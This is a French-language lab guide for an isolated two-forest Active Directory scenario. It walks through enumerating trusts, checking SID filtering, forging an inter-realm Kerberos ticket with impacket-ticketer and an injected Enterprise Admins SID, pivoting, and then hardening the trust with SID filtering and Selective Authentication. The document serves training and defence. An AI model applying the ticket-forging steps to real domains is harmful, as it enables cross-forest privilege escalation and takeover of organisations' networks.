# Build — Explorer et abuser d'un trust (lab isolé)

> Scénario M&A : forêt `nimbus.local` reliée à `corp.meridian.com` par un forest trust (architecture.md §11).
> On explore le trust, on teste SID history / inter-realm, puis on durcit.

## Pré-requis
- Deux forêts dans le lab (CORP + Nimbus) avec un **forest trust** (ou GOAD multi-domaines).
  Compromission d'un côté (assumed breach du domaine le moins sûr).

## Étape 1 — Énumérer les trusts
```bash
impacket-findDelegation ... ; nxc ldap <dc> -M enum_trusts
# PowerView : Get-DomainTrust / Get-ForestTrust
```
```powershell
Get-ADTrust -Filter * | Select Name, Direction, TrustType, @{n='SIDFilter';e={$_.SIDFilteringQuarantined}}
```

## Étape 2 — Vérifier le SID filtering
```powershell
# SID filtering actif = sIDHistory étranger ignoré (bonne pratique).
netdom trust corp.meridian.com /domain:nimbus.local /quarantine
```

## Étape 3 — Abus via SID history (si filtering faible, lab)
```bash
# Depuis le domaine compromis, forger un ticket inter-realm avec un SID privilégié de l'autre domaine
# (ex. Enterprise Admins) — nécessite la trust key (dump) + SID filtering désactivé.
impacket-ticketer -nthash <trust_key> -domain-sid <SID_src> -domain <src> \
  -extra-sid <SID_EA_cible> -spn krbtgt/<cible> Administrator
```

## Étape 4 — Pivoter
Utiliser le ticket inter-realm pour accéder aux ressources de la forêt cible.

## Étape 5 — Durcir (la vraie leçon)
Activer/forcer **SID filtering (quarantine)** et **Selective Authentication** sur le trust ; re-tester
→ l'abus SID history échoue.

## Vérification
- Abus SID history réussi AVANT durcissement ; échec APRÈS activation du SID filtering.

## Pièges courants
- SID filtering souvent désactivé « pour la compat M&A » → risque majeur.
- Oublier la direction/transitivité du trust.
